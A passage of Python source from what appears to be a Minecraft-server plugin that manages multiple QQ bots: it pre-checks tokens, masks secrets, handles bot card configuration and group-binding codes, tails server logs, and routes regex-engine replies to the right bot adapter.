        # 的时刻。加上指纹后：凭证一变就重新预检，没变则跳过。
        #
        # 每轮都重建一个全新的 dict（不用增量更新），这样删卡、清空凭证、
        # 改回旧值等各种边界情况下都不会残留脏条目。
        try:
            prev = getattr(self, "_qq_precheck_done", None)
            if not isinstance(prev, dict):
                prev = {}
            current: dict[str, str] = {}
            # 顺手检测「同一个 AppID 被多张卡重复配置」。
            # QQ 开放平台按 AppID 限频，两个网关实例拿着同一 AppID 并发
            # 请求 /app/getAppAccessToken 与 /gateway，会撞出
            # code 100017「接口调用超过频率限制」，表现为网关每 5 秒
            # 退出重启、时好时坏。这是配置问题，不是插件 bug，但用户
            # 从满屏重试日志里根本看不出来，所以这里主动点破。
            seen_appid: dict[str, str] = {}
            for card in hub.manager.adapters_of_type("qqofficial"):
                cid = str(card.get("id") or "")
                if not cid or not card.get("enabled"):
                    continue
                app_id = str(card.get("app_id", "") or "").strip()
                app_secret = str(card.get("app_secret", "") or "").strip()
                if not (app_id and app_secret):
                    continue          # 凭证不全，不预检也不记录
                name = str(card.get("name") or cid)
                if app_id in seen_appid:
                    self.logger.error(
                        "[QQ] 机器人 [%s] 与 [%s] 使用了同一个 AppID（%s…）。"
                        "同一 AppID 只能有一个网关在线，重复配置会互相抢登录"
                        "并触发接口频率限制，导致频繁掉线重连。"
                        "请为其中一张卡换一个 AppID，或直接停用它。",
                        name, seen_appid[app_id], app_id[:8],
                    )
                else:
                    seen_appid[app_id] = name
                # 只记指纹（不落明文密钥），既够用又不留敏感信息
                current[cid] = hashlib.sha1(
                    f"{app_id}\x00{app_secret}".encode("utf-8")
                ).hexdigest()[:16]
                if prev.get(cid) == current[cid]:
                    continue          # 凭证没变，跳过
                self.logger.info(f"[QQ] 开始 Token 预检：{name}")
                self._precheck_qq_token(self.conn_mgr.to_flat_config(card), libs)
            self._qq_precheck_done = current
        except Exception as e:
            self.logger.warning(f"[QQ] Token 预检未完成：{e}")
        hub.start_all(libs)

    def _precheck_qq_token(self, config, libs):
        try:
            if libs is None:
                self.logger.warning("[QQ] Token 预检跳过：第三方库不可用")
                return
            api_tmp = QQBotAPI(config, libs[0])
            api_tmp.logger = self.logger
            ok, msg = api_tmp.test_token_validity()
            self.logger.info(f"[QQ] Token 预检结果：{msg}")
            if not ok and str(config.get("env", "formal")).strip().lower() == "formal":
                self.logger.warning("[QQ] 预检失败。若为新注册机器人，请尝试在 QQ机器人 设置里将「运行环境」切换为沙箱环境，可绕过 IP 白名单。")
        except Exception as e:
            self.logger.warning(f"[QQ] Token 预检未完成：{e}")

    def _load_qqbot_config(self):
        """主官方卡片的扁平配置（兼容旧 web 层调用）。"""
        try:
            mgr = getattr(self, "conn_mgr", None)
            if mgr is not None:
                primary = mgr.primary_qqofficial()
                if primary is not None:
                    return mgr.to_flat_config(primary)
        except Exception as e:
            self.logger.error(f"[QQ] 读取机器人配置失败: {e}")
        path = self.data_dir / "qqbot.json"
        if path.exists():
            try:
                loaded = json.loads(path.read_text(encoding="utf-8"))
                if isinstance(loaded, dict):
                    return {**DEFAULT_QQBOT_CONFIG, **loaded}
            except Exception as e:
                self.logger.error(f"[QQ] 读取 qqbot.json 失败，使用默认配置: {e}")
        return dict(DEFAULT_QQBOT_CONFIG)

    def _qqbot_resolve_adapter(self, card_id=None):
        """按 ``card_id`` 解析官方机器人卡片，返回 ``(卡片, id)``。

        多机器人场景下「当前操作的是哪张卡」必须由调用方显式指定，
        否则所有请求都会落到「第一张卡」上，表现为 A 卡申请的多群验证码
        出现在 B 卡的编辑页里。

        ``card_id=None`` 时退化为「主卡」（第一张启用的，否则第一张），
        仅为兼容不传 id 的旧调用点（如启动提示、跨服转发）而保留。

        注意返回的是**深拷贝**：这里是读取语义，调用方不应该通过修改
        返回值来间接改配置，需要写回请一律走 ``mgr.update(pid, patch)``。
        """
        mgr = getattr(self, "conn_mgr", None)
        if mgr is None:
            return None, None
        cid = str(card_id or "").strip()
        if cid:
            card = mgr.get(cid)          # get() 已返回深拷贝
            if card is not None:
                return card, cid
            # 指定的卡片不存在：明确告知调用方，绝不静默回落到主卡，
            # 否则「按 id 操作」会退化成「操作主卡」，正是串台的成因。
            self.logger.warning(f"[QQ] 指定的机器人卡片不存在：{cid}")
            return None, None
        card = mgr.primary_qqofficial()
        if card is None:
            return None, None
        return card, str(card.get("id") or "") or None

    def _qqbot_primary_adapter(self):
        """返回主官方卡片（深拷贝 + id）；不存在返回 (None, None)。"""
        return self._qqbot_resolve_adapter(None)

    # ------------------------------------------------------------------
    # 多机器人管理（后端 API 支撑，配合 qq_hub / conn_mgr）
    # ------------------------------------------------------------------
    def _bots_list(self):
        """返回所有机器人卡片（掩码密钥）+ 每张的运行状态 + 用途元数据。"""
        hub = getattr(self, "qq_hub", None)
        if hub is None:
            return {"ok": True, "adapters": [], "primary": None,
                    "purposes": self._purpose_options()}
        status_map = {s["id"]: s for s in hub.status()}
        adapters = self.conn_mgr.snapshot(mask=True)
        for card in adapters:
            st = status_map.get(str(card.get("id")), {})
            card["running"] = st.get("running", False)
            card["connected"] = st.get("connected", False)
            card["configured"] = st.get("configured", False)
            # 用途兜底 + 人类可读标签一并下发，省得前端再维护一份
            # value→label 的映射（那种重复迟早会漂移）。
            p = normalize_purpose(card.get("purpose"))
            card["purpose"] = p
            card["purpose_label"] = PURPOSE_LABELS.get(p, p)
        primary_id = None
        try:
            primary_id = str(self.conn_mgr.primary_qqofficial().get("id"))
        except Exception:
            pass
        return {"ok": True, "adapters": adapters, "primary": primary_id,
                "types": ["qqofficial", "websocket"],
                "purposes": self._purpose_options()}

    def _bots_create(self, patch):
        """新建一张机器人卡片；成功后重载网关。"""
        if not isinstance(patch, dict):
            raise ValueError("数据格式不正确")
        adapter_type = str(patch.get("type", "") or "").strip()
        if adapter_type not in ("qqofficial", "websocket"):
            raise ValueError("type 只能为 qqofficial 或 websocket")
        created = self.conn_mgr.create(patch)
        self.logger.info(f"[机器人] 已新建卡片：{created.get('name')} ({adapter_type})")
        self._restart_qq_gateway()
        return {"ok": True, "adapter": self.conn_mgr.snapshot(mask=True),
                "created": {k: v for k, v in created.items() if k != "app_secret"}}

    def _bots_update(self, adapter_id, patch):
        """按 id 更新一张卡片；成功后重载网关。"""
        if not isinstance(patch, dict):
            raise ValueError("数据格式不正确")
        adapter_id = str(adapter_id or "").strip()
        if not adapter_id:
            raise ValueError("缺少卡片 id")
        updated = self.conn_mgr.update(adapter_id, patch)
        self.logger.info(f"[机器人] 已更新卡片：{updated.get('name')}")
        self._restart_qq_gateway()
        return {"ok": True, "adapter": updated}

    def _bots_toggle(self, adapter_id, enabled):
        """启用/禁用一张卡片；成功后重载网关。"""
        adapter_id = str(adapter_id or "").strip()
        if not adapter_id:
            raise ValueError("缺少卡片 id")
        enabled = bool(enabled)
        updated = self.conn_mgr.update(adapter_id, {"enabled": enabled})
        self.logger.info(f"[机器人] 已{'启用' if enabled else '禁用'}卡片：{updated.get('name')}")
        self._restart_qq_gateway()
        return {"ok": True, "adapter": updated}

    def _bots_delete(self, adapter_id):
        """删除一张卡片；成功后重载网关。"""
        adapter_id = str(adapter_id or "").strip()
        if not adapter_id:
            raise ValueError("缺少卡片 id")
        ok = self.conn_mgr.delete(adapter_id)
        if not ok:
            raise ValueError("卡片不存在")
        self.logger.info(f"[机器人] 已删除卡片：{adapter_id}")
        self._restart_qq_gateway()
        return {"ok": True}

    def _qqbot_apply_qr_credentials(self, card_id, app_id, app_secret):
        """把扫码拿到的 AppID / AppSecret 写进指定卡片并重启网关。

        ``card_id`` 为空时挑第一张 ``qqofficial`` 卡片。

        返回 ``(ok, message)``。**绝不回传 AppSecret** —— 日志里也只打
        前 4 位，避免凭据随着日志被复制传播。
        """
        app_id = str(app_id or "").strip()
        app_secret = str(app_secret or "").strip()
        if not app_id or not app_secret:
            return False, "凭据不完整"

        mgr = getattr(self, "conn_mgr", None)
        if mgr is None:
            return False, "连接管理器未就绪"

        target = None
        cid = str(card_id or "").strip()
        if cid:
            target = mgr.get(cid)
        if target is None:
            # 没指定卡片：优先第一张 qqofficial，其次第一张任意卡片
            for card in mgr.snapshot() or []:
                if str(card.get("type")) == "qqofficial":
                    target = card
                    break
            if target is None:
                cards = list(mgr.snapshot() or [])
                target = cards[0] if cards else None
        if target is None:
            return False, "没有可写入的机器人卡片，请先在「机器人」里新建一张"

        try:
            updated = mgr.update(str(target.get("id")), {
                "app_id": app_id,
                "app_secret": app_secret,
                "enabled": True,
            })
        except Exception as e:
            self.logger.warning(f"[QQ扫码] 写入卡片失败: {e}")
            return False, f"写入卡片失败：{e}"

        self.logger.info(
            f"[QQ扫码] 卡片「{updated.get('name')}」已写入凭据 "
            f"AppID={app_id} AppSecret={app_secret[:4]}..."
            f"{'*' * max(0, len(app_secret) - 4)}"
        )
        self._restart_qq_gateway()
        return True, f"已绑定到卡片「{updated.get('name')}」，网关正在重载"

    def _qqbot_public_config(self, card_id=None):

        primary, _ = self._qqbot_resolve_adapter(card_id)
        if primary is None:
            return {"enabled": True, "config": dict(DEFAULT_QQBOT_CONFIG)}
        cfg = self.conn_mgr.to_flat_config(primary)
        pub = dict(cfg)
        if str(pub.get("app_secret", "")) not in ("", "__SET__"):
            pub["app_secret"] = "__SET__"
        admins = pub.get("group_admins", [])
        pub["group_admins"] = list(admins) if isinstance(admins, list) else []
        return {"enabled": bool(primary.get("enabled", True)), "config": pub}

    def _qqbot_status(self, card_id=None):
        mgr = getattr(self, "conn_mgr", None)
        primary, pid = self._qqbot_resolve_adapter(card_id) if mgr is not None else (None, None)
        cfg = self.conn_mgr.to_flat_config(primary) if (mgr is not None and primary) else {}
        enabled = bool(primary.get("enabled", True)) if primary else False
        # 缺哪些必填项 —— 必须按「当前这张卡」算。之前这里是硬编码的 []，
        # 导致 web 层那句「请先完成 AppID/AppSecret 配置」的前置校验从来
        # 没生效过；同时也让前端没法提示用户到底缺什么。
        missing = []
        if primary is not None:
            if not str(cfg.get("app_id", "") or "").strip():
                missing.append("AppID")
            if not str(cfg.get("app_secret", "") or "").strip():
                missing.append("AppSecret")
        running = False
        connected = False
        binding_code = None
        hub = getattr(self, "qq_hub", None)
        if hub is not None and pid:
            gw = hub.gateway_by_id(pid)
            if gw is not None:
                running = True
                try:
                    connected = bool(gw._connected.is_set())
                except Exception:
                    connected = False
                try:
                    if not str(gw.config.get("group_openid", "") or "").strip():
                        binding_code = getattr(gw, "binding_code", None)
                except Exception:
                    pass
        groups = cfg.get("groups") or []
        if not isinstance(groups, list):
            groups = []
        group_list = []
        for g in groups:
            if isinstance(g, dict) and str(g.get("openid", "") or "").strip():
                group_list.append({
                    "openid": str(g["openid"]).strip(),
                    "name": str(g.get("name", "") or "").strip() or str(g["openid"]).strip(),
                })
        pending = cfg.get("pending_group_binds") or []
        if not isinstance(pending, list):
            pending = []
        pending_codes = []
        for p in pending:
            if isinstance(p, dict) and str(p.get("code", "") or "").strip():
                pending_codes.append({
                    "code": str(p["code"]).strip()[:4],
                    "ts": int(p.get("ts") or 0),
                })
        return {"enabled": enabled, "running": running, "connected": connected,
                "missing": missing, "binding_code": binding_code,
                "group_openid": str(cfg.get("group_openid", "") or ""),
                "groups": group_list, "pending_codes": pending_codes}

    def _qqbot_persist_group_openid(self, group_openid, card_id=None):
        mgr = getattr(self, "conn_mgr", None)
        if mgr is None:
            path = self.data_dir / "qqbot.json"
            current = self._load_qqbot_config()
            current["group_openid"] = str(group_openid or "")
            if not atomic_write_json(path, current, indent=2):
                raise RuntimeError("写入配置失败")
            bot = getattr(self, "qq_bot", None)
            if bot is not None:
                try:
                    bot.config["group_openid"] = str(group_openid or "")
                except Exception:
                    pass
            return
        primary, pid = self._qqbot_resolve_adapter(card_id)
        if primary is None or pid is None:
            return
        # primary 是深拷贝，改它不会影响配置；真正的写入在下面的 update
        try:
            mgr.update(pid, {"group_openid": str(group_openid or "")})
        except Exception as e:
            raise RuntimeError(f"写入配置失败: {e}")
        gw = self._hub_gateway_for(pid)
        if gw is not None:
            try:
                gw.config["group_openid"] = str(group_openid or "")
            except Exception:
                pass

    def _hub_gateway_for(self, card_id):
        hub = getattr(self, "qq_hub", None)
        if hub is None or not card_id:
            return None
        return hub.gateway_by_id(card_id)

    def _qqbot_save_group_binds(self, live_config, keep_secret=False, card_id=None):
        mgr = getattr(self, "conn_mgr", None)
        primary, pid = self._qqbot_resolve_adapter(card_id) if mgr is not None else (None, None)
        if primary is None or pid is None:
            return
        patch = {}
        goid = str((live_config or {}).get("group_openid", "") or primary.get("group_openid", ""))
        patch["group_openid"] = goid
        groups = (live_config or {}).get("groups")
        if isinstance(groups, list):
            patch["groups"] = groups
        pending = (live_config or {}).get("pending_group_binds")
        if isinstance(pending, list):
            patch["pending_group_binds"] = pending
        try:
            mgr.update(pid, patch)
        except Exception as e:
            raise RuntimeError(f"写入配置失败: {e}")
        gw = self._hub_gateway_for(pid)
        if gw is not None:
            try:
                gw.config["group_openid"] = str(patch.get("group_openid", "") or "")
                gw.config["groups"] = list(patch.get("groups") or [])
                gw.config["pending_group_binds"] = list(patch.get("pending_group_binds") or [])
            except Exception:
                pass

    def _qqbot_new_group_code(self, card_id=None):
        """为「加入新群」生成一个 4 位验证码，返回该码。

        ⚠ **一次只保留一个有效码** —— 这里刻意是**覆盖**写入，不是追加。

        历史行为（已改）：原实现是 ``pending.insert(0, 新码)`` 且保留最近
        20 个，等于把验证码当成一个**可累积的队列**。但群消息那边只比对
        ``pending[0]``（最新那个），于是界面上列出的一串码里，**只有最新
        的那个真正能用** —— 用户照着旧码发过去必然绑定失败，看起来就是
        「验证码失效了」，实则是显示与行为对不上。

        现在语义收紧为一码一用：
          * 申请新码 → 旧码立即作废（同一个群里同时只可能有一个待用码）；
          * 成功加入一个群 → 该码被消费掉（见 ``_consume_pending_code``）。

        注意 ``_qqbot_resolve_adapter`` 返回的是**深拷贝**，读它的
        ``pending_group_binds`` 反映不了同一进程内上一次的写入。所幸改成
        覆盖后不再需要读旧值，这个隐患自然消失。
        """
        mgr = getattr(self, "conn_mgr", None)
        primary, pid = self._qqbot_resolve_adapter(card_id) if mgr is not None else (None, None)
        if primary is None or pid is None:
            return f"{secrets.randbelow(10000):04d}"
        code = f"{secrets.randbelow(10000):04d}"
        # 覆盖式：列表里永远最多一条，与群消息只认 pending[0] 的行为严格一致。
        pending = [{"code": code, "ts": int(time.time())}]
        try:
            mgr.update(pid, {"pending_group_binds": pending})
        except Exception as e:
            raise RuntimeError(f"写入配置失败: {e}")
        gw = self._hub_gateway_for(pid)
        if gw is not None:
            try:
                gw.config["pending_group_binds"] = list(pending)
            except Exception:
                pass
        return code

    def _qqbot_save_config(self, payload, card_id=None):

        if not isinstance(payload, dict):
            raise ValueError("数据格式不正确")
        mgr = getattr(self, "conn_mgr", None)
        primary, pid = self._qqbot_resolve_adapter(card_id) if mgr is not None else (None, None)
        if primary is None or pid is None:
            raise RuntimeError("尚未初始化机器人配置")
        current = dict(DEFAULT_QQBOT_CONFIG)
        for k, v in primary.items():
            if k in ("type", "id", "name", "enabled", "sync"):
                continue
            current[k] = v
        for k, v in (primary.get("sync") or {}).items():
            current[k] = v
        current["enabled"] = bool(primary.get("enabled", True))
        bool_keys = ("enabled", "qq_to_mc", "mc_to_qq", "join_to_qq", "leave_to_qq",
                     "notify_start", "notify_stop")
        num_keys = ("reconnect_seconds", "reconnect_seconds_max", "send_rate_per_min",
                    "send_burst", "recv_rate_per_sec", "recv_burst", "max_bytes_per_sec",
                    "intent_fail_circuit_threshold", "circuit_retry_seconds",
                    "rate_limit_backoff_initial", "rate_limit_backoff_cap",
                    "heartbeat_miss_limit")
        for k in DEFAULT_QQBOT_CONFIG:
            if k not in payload:
                continue
            v = payload[k]
            if k in bool_keys:
                current[k] = bool(v)
            elif k in num_keys:
                try:
                    current[k] = max(0, float(v or 0))
                except (TypeError, ValueError):
                    current[k] = DEFAULT_QQBOT_CONFIG[k]
            elif k == "custom_keywords":

                cleaned = {}
                if isinstance(v, dict):
                    items = v.items()
                elif isinstance(v, list):
                    items = []
                    for it in v:
                        if isinstance(it, dict):
                            items.append((it.get("keyword") or it.get("key"), it.get("reply") or it.get("value")))
                    items = [x for x in items if x[0] is not None]
                else:
                    items = []
                for kw, rep in items:
                    kw = str(kw or "").strip()
                    rep = str(rep or "").strip()
                    if kw and rep:
                        cleaned[kw] = rep
                current[k] = cleaned
            elif k == "group_admins":
                if isinstance(v, list):
                    current[k] = [str(x).strip() for x in v if str(x).strip()]
                else:
                    items = str(v or "").replace("，", ",").split(",")
                    current[k] = [x.strip() for x in items if x.strip()]
            elif k == "app_secret":
                if str(v) not in ("", "__SET__"):
                    current[k] = str(v)
            elif k == "groups":
                cleaned = []
                if isinstance(v, list):
                    for g in v:
                        if isinstance(g, dict) and str(g.get("openid", "") or "").strip():
                            cleaned.append({
                                "openid": str(g["openid"]).strip(),
                                "name": str(g.get("name", "") or "").strip() or str(g["openid"]).strip(),
                            })
                elif isinstance(v, str):
                    for part in str(v).replace("，", ",").split(","):
                        part = part.strip()
                        if part:
                            cell = part
                            nm = ""
                            if "=" in cell:
                                cell, nm = cell.split("=", 1)
                            cell = cell.strip()
                            if cell:
                                cleaned.append({"openid": cell, "name": nm.strip() or cell})
                current[k] = cleaned
            elif k == "pending_group_binds":
                if isinstance(v, list):
                    stream = []
                    for p in v:
                        if isinstance(p, dict) and str(p.get("code", "") or "").strip():
                            stream.append({
                                "code": str(p["code"]).strip()[:4],
                                "ts": int(p.get("ts") or 0),
                            })
                    current[k] = stream[:20]
            elif k == "banned_words":
                if isinstance(v, list):
                    out = []
                    for w in v:
                        w = str(w or "").strip()
                        if w:
                            out.append(w)
                    current[k] = out[:500]
                elif isinstance(v, str):
                    out = []
                    for w in str(v).replace("，", ",").split(","):
                        w = w.strip()
                        if w:
                            out.append(w)
                    current[k] = out[:500]
            else:
                current[k] = v
        # 扁平配置写回主卡片：sync 收纳互通类键，其余为卡片顶层键
        patch: dict[str, Any] = {}
        for k, v in current.items():
            if k in _FLAT_SYNC_KEYS and k not in ("enabled",):
                patch.setdefault("sync", {})[k] = v
            else:
                patch[k] = v
        try:
            mgr.update(pid, patch)
        except Exception as e:
            raise RuntimeError(f"写入配置失败: {e}")

        threading.Thread(target=self._restart_qq_gateway, daemon=True).start()
        return True, "配置已保存，网关正在后台重载"

    # ================================================== 正则引擎 ↔ 适配器桥
    #
    # 正则引擎（regex_engine.py）不认识我们的「卡片式多适配器」模型，
    # 也不该认识 —— 它只管调用下面这组方法。所有「该发给哪张卡、
    # 走官方协议还是 OneBot」的判断都收在这里，改一处即可。
    #
    # ⚠ 一律用 getattr(self, "_card_*", None) 取卡，绝不用 self.qq_bot：
    #   qq_bot 只是「主卡」引用，用户禁用主卡只留第二张卡时它会失效。

    def _regex_config(self) -> Dict[str, Any]:
        """正则引擎的运行时开关（存 tools 配置，网页可改）。"""
        try:
            cfg = self._load_tools_config().get("regex_engine", {}) or {}
        except Exception:
            cfg = {}
        if not isinstance(cfg, dict):
            cfg = {}
        return {
            "enable": bool(cfg.get("enable", True)),
            "only_on_main": bool(cfg.get("only_on_main", False)),
            "admin_debug": bool(cfg.get("admin_debug", False)),
            "command_timeout": float(cfg.get("command_timeout", 5.0) or 5.0),
            # 日志采集开关。默认 False —— 这是新增能力，不该在升级后
            # 默默开始读文件、开始往群里发报错。用户显式打开才生效。
            "log_enabled": bool(cfg.get("log_enabled", False)),
            "log_start_at_end": bool(cfg.get("log_start_at_end", True)),
        }

    # ---------------------------------------------------- 控制台日志采集
    def _start_log_tailer(self) -> None:
        """按需启动/重启日志采集线程。

        三条不变量：
          1. 引擎没加载 → 直接不启（没有消费者，读了也是白读）。
          2. ``log_enabled`` 关着 → 停掉已有线程并返回。用户关开关必须
             **立刻**停，不能等重启。
          3. 重复调用安全（先停后起），这样配置保存后重载不会泄漏线程。
        """
        engine = getattr(self, "regex_engine", None)
        cfg = self._regex_config()

        if engine is None or not cfg.get("log_enabled"):
            self._stop_log_tailer()
            return

        self._stop_log_tailer()
        tailer = LogTailer(self, self._on_log_line)
        ok = tailer.start(start_at_end=bool(cfg.get("log_start_at_end", True)))
        if ok:
            self.log_tailer = tailer
            self.logger.info(
                f"[日志采集] 已启动（{'只跟新行' if cfg.get('log_start_at_end', True) else '从文件头重放'}）"
                f"：{tailer._path}")
        else:
            # 读不到日志不是错误：没启用文件日志、路径找不到都属正常。
            # 只在 debug 级别留痕，避免升级后一堆用户看到红色报错。
            self.log_tailer = None
            self.logger.debug(f"[日志采集] 未启动：{tailer.last_error}")

    def _stop_log_tailer(self) -> None:
        t = getattr(self, "log_tailer", None)
        if t is not None:
            try:
                t.stop()
            except Exception:
                pass
        self.log_tailer = None

    def _on_log_line(self, rec: Dict[str, Any]) -> None:
        """采集线程的回调：一行日志 → 一条 server.log_line 事件。

        ⚠ 本方法在**采集线程**里执行，不在主线程。
        这里**绝不能**碰任何需要主线程的东西（比如 executeCommand）——
        regex_engine 对此有专门的分支处理，见其 executeCommand 注释。

        pack 的构造顺序有意为之：``raw_message`` 放正文（pattern 匹配它、
        ``$raw_message`` 回显它），``level`` / ``source`` / ``time``
        放独立字段供 conditions 过滤。这样「匹配 [ERROR] 开头」这件事
        是 ``level == "ERROR"``，而不是让用户写 ``^\\[Server/ERROR\\]``。
        """
        engine = getattr(self, "regex_engine", None)
        if engine is None:
            return
        pack = {
            # 与群事件保持同样的字段名：user_id 在日志语境下没有意义，
            # 但引擎的 handle_event 会用它兜底，留空串比缺字段好。
            "user_id": "",
            "raw_message": rec.get("raw_message", ""),
            "level": str(rec.get("level") or "UNKNOWN"),
            "source": str(rec.get("source") or ""),
            "time": str(rec.get("time") or ""),
            "raw_line": rec.get("raw_line", ""),
            # 日志没有群/卡片归属，回复目标交给「默认群」解析
            "group_id": "",
            "card_id": "",
        }
        try:
            engine.handle_event(EVENT_LOG_LINE, pack)
        except Exception as e:
            self.logger.warning(f"[日志采集] 规则处理失败: {e}")

    def _regex_cards(self) -> List[Any]:
        """所有已启用的 **群服互通** QQ 官方机器人网关实例。

        hub 的 ``_gateways`` 是 card_id → 实例的大字典，里面**官方网关和
        OneBot 适配器混在一起**。这里只挑官方网关（有 ``send_qq_text``
        且没有 ``send_group_msg`` 的那些）—— 靠类型判断会被动态挂载的
        属性绕晕，靠方法名反而稳。

        ★ 用途过滤（v7.8）：只返回 ``bridge`` 的卡。
        正则规则是"群消息 → 服务器"和"服务器 → 群"这条双向链路的一个环，
        它的回复目标群应当是互通群。把 ``broadcast`` 卡也算进来会导致：
          · 一张只打算收 AI 播报的群，忽然收到「查服」的回复；
          · 规则的默认回复目标（``_qqbot_default_group``）可能落到播报群上，
            因为找不到聊天来源群时会回退到"主卡的主群"。
        ``reserved`` 卡同理：第三方插件接管了它，我们不该往里发东西。
        """
        hub = getattr(self, "qq_hub", None)
        gateways = getattr(hub, "_gateways", None) if hub is not None else None
        if not isinstance(gateways, dict):
            return []
        cards = []
        for gid, gw in gateways.items():
            if gw is None:
                continue
            try:
                if hub._gateway_purpose(str(gid), gw) != PURPOSE_BRIDGE:
                    continue
            except Exception:
                pass
            if callable(getattr(gw, "send_qq_text", None)) and not callable(
                getattr(gw, "send_group_msg", None)
            ):
                cards.append(gw)
        return cards

    def _regex_adapters(self) -> List[Any]:
        """所有已启动且用途为 **群服互通** 的 OneBot v11 适配器实例。"""
        hub = getattr(self, "qq_hub", None)
        gateways = getattr(hub, "_gateways", None) if hub is not None else None
        if not isinstance(gateways, dict):
            return []
        out = []
        for gid, gw in gateways.items():
            if gw is None or not callable(getattr(gw, "send_group_msg", None)):
                continue
            try:
                if hub._gateway_purpose(str(gid), gw) != PURPOSE_BRIDGE:
                    continue
            except Exception:
                pass
            out.append(gw)
        return out

    # ---------------------------------------------------------- 机器人用途
    def _card_purpose(self, card_id: str = "", *, default: str = PURPOSE_BRIDGE) -> str:
        """某张卡的用途；查不到时返回 ``default``。

        与 ``hub._gateway_purpose`` 的分工：那个查的是**运行中实例**，
        这个查的是**配置**（``conn_mgr``）。需要判断"这张卡该不该收到
        某类消息"时用这个 —— 配置才是用户的意图。
        """
        mgr = getattr(self, "conn_mgr", None)
        if mgr is None:
            return default
        try:
            return normalize_purpose(mgr.purpose_of(str(card_id or "")))
        except Exception:
            return default

    def _purpose_of_gateway(self, gw) -> str:
        """取网关实例的用途（三层兜底，与 hub 保持一致）。

        出站链路手里往往只有 ``gw`` 没有 ``card_id``，而 ``gw._card_purpose``
        是 ``_spawn`` 时挂的副本 —— 网关可能是上一轮 spawn 出来的旧实例，
        副本未必等于当前配置。所以这里先信副本、再回查配置。
        """
        if gw is None:
            return PURPOSE_BRIDGE
        inst = getattr(gw, "_card_purpose", None)
        if isinstance(inst, str) and inst:
            return normalize_purpose(inst)
        return self._card_purpose(str(getattr(gw, "_card_id", "") or ""))

    def _gateways_by_purpose(self, purpose: str, *, adapter_type: str = "") -> List[Any]:
        """按用途取**运行中**的网关实例。"""
        hub = getattr(self, "qq_hub", None)
        if hub is None:
            return []
        try:
            return list(hub.gateways_by_purpose(purpose, adapter_type=adapter_type) or [])
        except Exception:
            return []

    def _purpose_options(self) -> List[Dict[str, str]]:
        """用途三选一的选项表（供前端渲染下拉；保持顺序稳定）。"""
        return [
            {"value": p, "label": PURPOSE_LABELS.get(p, p),
             "hint": PURPOSE_HINTS.get(p, "")}
            for p in PURPOSES
        ]

    def _ai_purpose_summary(self) -> Dict[str, Any]:
        """给 AI 面板看的机器人用途分布。

        面板需要这个来回答一个很实际的问题：「我点了播报，为什么没反应？」
        答案通常是「没有任何一个机器人被设成 AI 播报」。把这个分布
        直接展示出来，比让用户自己一个个点开机器人卡片去数要直观得多。
        """
        out: Dict[str, Any] = {p: 0 for p in PURPOSES}
        cards: List[Dict[str, Any]] = []
        try:
            mgr = getattr(self, "conn_mgr", None)
            # 用 adapters_view()（内部持锁 + deepcopy）而不是直接读 .adapters：
            # 这个接口会被前端轮询，和用户保存卡片是并发的，
            # 直接读会在"保存到一半"时看到半个 dict。
            adapters = list(mgr.adapters_view()) if mgr is not None else []
        except Exception:
            adapters = []
        for a in adapters:
            try:
                p = normalize_purpose(a.get("purpose"))
            except Exception:
                p = PURPOSE_BRIDGE
            if a.get("enabled"):
                out[p] = int(out.get(p, 0)) + 1
            cards.append({
                "id": str(a.get("id") or ""),
                "name": str(a.get("name") or ""),
                "type": str(a.get("type") or ""),
                "enabled": bool(a.get("enabled")),
                "purpose": p,
                "purpose_label": PURPOSE_LABELS.get(p, p),
            })
        return {"counts": out, "labels": dict(PURPOSE_LABELS),
                "options": self._purpose_options(), "cards": cards}

    def _regex_find_card(self, card_id: str = "") -> Any:
        """按 card_id 找官方网关；card_id 为空时回退主卡。"""
        cid = str(card_id or "").strip()
        if cid:
            for card in self._regex_cards():
                if str(getattr(card, "_card_id", "") or "") == cid:
                    return card
            return None
        return getattr(self, "qq_bot", None)

    def _qqbot_card_admins(self, card_id: str = "") -> List[str]:
        """某张卡的群管理员 openid 列表（供 ``userRole`` 条件判断）。"""
        card = self._regex_find_card(card_id)
        if card is None:
            return []
        try:
            admins = card.config.get("group_admins") or []
        except Exception:
            return []
        if not isinstance(admins, list):
            return []
        return [str(x) for x in admins if x]

    def _qqbot_default_group(self, card_id: str = "") -> str:
        """默认回复群 openid。

        优先取该卡的 ``group_openid``（主群）；没有就取已绑定群里的第一个。
        ``group_id`` 为空时动作输出会被静默丢弃，所以这里必须给出一个
        真实可发的目标，不能返回空串了事。
        """
        card = self._regex_find_card(card_id)
        if card is None:
            return ""
        try:
            primary = str(card.config.get("group_openid", "") or "").strip()
            if primary:
                return primary
        except Exception:
            pass
        try:
            bound = card._bound_group_openids()
            if bound:
                return str(bound[0])
        except Exception:
            pass
        return ""

    def _regex_send_text(self, group_id: str, content: str) -> None:
        """向指定群发文本（官方协议 / OneBot 自动分流）。"""
        text = str(content or "").strip()
        if not text:
            return
        target = str(group_id or "").strip()
        target = target or self._qqbot_default_group("")
        if not target:
            self.logger.warning("[正则引擎] 没有可用的回复群，回复被丢弃")
            return
        self._regex_dispatch(target, {"type": "text", "content": text})

    def _regex_send_at_text(self, group_id: str, target_user: Any, content: str) -> None:
        """@ 某人后接文本。

        官方协议支持 ``<@openid>`` 内联；OneBot 走 at 消息段。
        两种都退化成「文本里写上 id」也比发不出去强。
        """
        text = str(content or "")
        uid = str(target_user or "").strip()
        if not uid:
            self._regex_send_text(group_id, text)
            return
        target = str(group_id or "").strip() or self._qqbot_default_group("")
        if not target:
            self.logger.warning("[正则引擎] 没有可用的回复群，@ 回复被丢弃")
            return
        seg = {"type": "at", "data": {"qq": uid}}
        self._regex_dispatch(target, [seg, {"type": "text", "data": {"text": text}}])

    def _regex_send_image(self, group_id: str, url: str) -> None:
        """发一张图（URL）。"""
        src = str(url or "").strip()
        if not src:
            return
        target = str(group_id or "").strip() or self._qqbot_default_group("")
        if not target:
            self.logger.warning("[正则引擎] 没有可用的回复群，图片被丢弃")
            return
        self._regex_dispatch(target, [{"type": "image", "data": {"file": src}}])

    def _regex_dispatch(self, group_id: str, message: Any) -> None:
        """把一条消息交给对应适配器发送。

        判断依据是 group_id 属于哪张卡的绑定群 —— 同一台服务器上
        官方机器人和 OneBot 可能同时在线，发错卡就是串台。
        """
        group = str(group_id or "").strip()
        if not group:
            return
        # ① 官方机器人卡片
        for card in self._regex_cards():
            try:
                if group in card._bound_group_openids():
                    card.send_qq_text(self._regex_flatten(message))
                    return
            except Exception:
                continue
        # ② OneBot 适配器
        for adapter in self._regex_adapters():
            try:
                if group in [str(g) for g in (getattr(adapter, "groups", None) or [])]:
                    adapter.send_group_msg(int(group) if group.isdigit() else group, message)
                    return
            except Exception:
                continue
